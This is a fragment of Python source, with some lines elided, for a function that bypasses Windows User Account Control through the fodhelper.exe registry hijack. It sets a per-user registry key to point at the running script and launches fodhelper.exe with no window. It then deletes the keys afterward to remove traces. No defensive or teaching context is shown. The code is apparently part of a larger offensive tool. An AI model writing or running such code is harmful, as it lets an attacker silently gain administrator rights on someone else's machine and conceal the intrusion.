...
def elevate_privileges_fodhelper():
    ...
    if not WINDOWS_AVAILABLE:
        print("[WARN] Not on Windows, cannot attempt UAC bypass.")
        return
    ...
    try:
        ...
        print(f"[INFO] Registry key for fodhelper.exe created: {current_script_path}")

        # Execute fodhelper.exe
        subprocess.Popen(["fodhelper.exe"], creationflags=subprocess.CREATE_NO_WINDOW)

        # Clean up registry keys after a short delay (optional, but good practice)
        time.sleep(5)  # Give fodhelper time to launch
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path + "\\command")
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
            print("[INFO] Cleaned up fodhelper.exe registry keys.")
        except Exception as e:
            print(f"[WARN] Could not clean up fodhelper.exe registry keys: {e}")

    except Exception as e:
        print(f"[ERROR] Failed to elevate privileges using fodhelper.exe: {e}")
